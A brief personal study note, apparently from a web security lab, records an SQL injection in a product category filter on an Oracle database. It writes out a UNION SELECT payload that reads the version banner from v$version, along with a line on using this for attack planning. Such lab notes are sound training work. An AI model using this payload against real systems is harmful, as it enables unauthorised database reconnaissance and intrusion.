---
topic: SQL injection
level: Practitioner
time_spent: 10 mins
date: 23rd Nov, 2026
Database type: Oracle
---
**Vulnerability:** 
SQL injection vulnerability in the product category filter.

**Payload:**
```
category='+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

**What I learned:**
We can use SQL injection to find out the database version and the details we require to further plan the attack.
![](SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle.md_Attachments/-20261123.png)